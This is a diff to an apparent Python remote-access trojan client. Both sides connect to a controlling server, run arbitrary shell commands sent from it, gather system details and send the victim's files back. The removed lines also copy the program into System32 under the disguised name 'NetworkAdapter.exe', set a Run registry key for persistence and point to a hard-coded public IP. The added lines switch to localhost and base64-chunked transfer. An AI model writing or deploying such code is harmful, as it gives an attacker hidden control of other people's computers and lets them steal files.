@@ -1,123 +1,30 @@
-from shutil import copyfile
-import requests
 import platform
-import win32api
-import win32con
+import requests
+import base64
 import socket
-import winreg
 import json
 import time
-import sys
-import os
 import re
+import os
 
-# Send dynamic length socket data
-def send_dyn_socket(server, content):
-    send_data = json.dumps({
-                'type': 'data',
-                'content': content
-            }).encode()
-    server.send(json.dumps({
-        'type': 'length',
-        'content': len(send_data)
-    }).encode())
-    while True:
-        recv_data = server.recv(2048).decode()
-        json_data = json.loads(recv_data)
-        if json_data['type'] == 'okay':
-            server.send(send_data)
-            break
-        else:
-            continue
-
-
-def exec_shell(server, command): # Execute shell command
-    console_return = "".join(os.popen(command).readlines())
-    send_dyn_socket(server, console_return)
-
-
-def scan_dir(server, path): # Scan directory
-    scan_result = os.listdir(path)
-    dir_list = list()
-    file_list = list()
-    for direntry in scan_result:
-        sub_path = path + os.path.sep + direntry
-        if os.path.isfile(sub_path):
-            file_list.append(direntry)
-        elif os.path.isdir(sub_path):
-            dir_list.append(direntry)
-    entire_dir = list((dir_list, file_list))
-    send_dyn_socket(server, entire_dir)
-
-
-def get_info(server): # Get system info
-    send_info = json.dumps({
-        'ip': get_ip(),
-        'node': platform.node(),
-        'platform': platform.platform(),
-        'version': platform.version(),
-        'processor': platform.processor()
-    })
-    send_dyn_socket(server, send_info)
-
-
-def download_file(server, filepath): # Get file
-    if os.path.exists(filepath):
-        buf = bytearray(os.path.getsize(filepath))
-        with open(filepath, 'rb') as file:
-            file.readinto(buf)
-        send_dyn_socket(server, buf.hex())
+def multipart_send(server, content, isfile):
+    content = str(content)
+    cut_data = list()
+    if len(content) <= 1456:
+        cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content.encode('utf-8')).decode('utf-8'), 'key': 'EOF'}).encode('utf-8'))
     else:
-        send_dyn_socket(server, 'File does not exists')
-
-
-def tcpClient(client):
-    while True:
-        try:
-            recv_data = client.recv(2048).decode()
-            json_data = json.loads(recv_data)
-            match json_data['type']:
-                case 'heartbeat':
-                    continue
-                case 'shell':
-                    exec_shell(client, json_data['content'])
-                case 'scandir':
-                    scan_dir(client, json_data['content'])
-                case 'info':
-                    get_info(client)
-                case 'downfile':
-                    download_file(client, json_data['content'])
-        except:
-            client.close()
-            connect()
-            return
-
-
-def auto_run():
-    path = os.getcwd() + os.path.sep + os.path.basename(sys.argv[0])
-    copyfile(path, 'C:\\Windows\\System32\\NetworkAdapter.exe')
-    def zhao():
-        location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
-        i = 0
-        while True:
-            try:
-                if winreg.EnumValue(key, i)[0] == 'NetworkAdapter':
-                    return True
-                i += 1
-            except OSError as error:
-                winreg.CloseKey(key)
-                break
-
-    flag = zhao()
-    if flag:
-        pass
-    else:
-        sys.setrecursionlimit(1000000)
-        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
-                                  win32con.KEY_ALL_ACCESS)
-        win32api.RegSetValueEx(key, 'NetworkAdapter', 0, win32con.REG_SZ, 'C:\\Windows\\System32\\NetworkAdapter.exe')
-        win32api.RegCloseKey(key)
+        while len(content) > 1456:
+            cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content[:1456].encode('utf-8')).decode('utf-8'), 'key': 'NXT'}).encode('utf-8'))
+            content = content[1456:]
+        cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content.encode('utf-8')).decode('utf-8'), 'key': 'EOF'}).encode('utf-8'))
+    if isfile:
+        server.send(json.dumps({'type': 'len', 'content': len(cut_data), 'key': 'NXT'}).encode('utf-8'))
+    for data in cut_data:
+        print(data)
+        server.send(data)
+        time.sleep(0.001)
+    cut_data.clear()
+    content = ''
 
 
 def get_ip():
@@ -129,9 +36,52 @@ def get_ip():
         return '0:0:0:0'
 
 
+def get_info(server):
+    multipart_send(server, json.dumps({
+        'ip': get_ip(),
+        'node': platform.node(),
+        'platform': platform.platform(),
+        'version': platform.version(),
+        'processor': platform.processor()
+    }).encode('utf-8'), False)
+
+
+def exec_shell(server, command):
+    console_return = ''.join(os.popen(command).readlines())
+    multipart_send(server, console_return.encode('utf-8'), False)
+
+def fetch_file(server, filepath):
+    file_buf = bytearray(os.path.getsize(filepath))
+    with open(filepath, 'rb') as file:
+        file.readinto(file_buf)
+    buf_str = str(file_buf.hex().encode('utf-8'))
+    multipart_send(server, buf_str, True)
+    buf_str = ''
+
+
+def tcpClient(client):
+    while True:
+        try:
+            recv_data = client.recv(2048).decode('utf-8')
+            json_data = json.loads(recv_data)
+            match json_data['type']:
+                case 'heartbeat':
+                    continue
+                case 'info':
+                    get_info(client)
+                case 'shell':
+                    exec_shell(client, json_data['content'])
+                case 'fetch':
+                    fetch_file(client, json_data['content'])
+        except:
+            client.close()
+            connect()
+            return
+
+
 def connect():
-    host = '123.160.10.39'
-    port = 55575
+    host = '127.0.0.1'
+    port = 8088
     try:
         client = socket.socket()
         client.connect((host, port))
@@ -148,5 +98,4 @@ def connect():
 
 
 if __name__ == '__main__':
-    auto_run()
     connect()
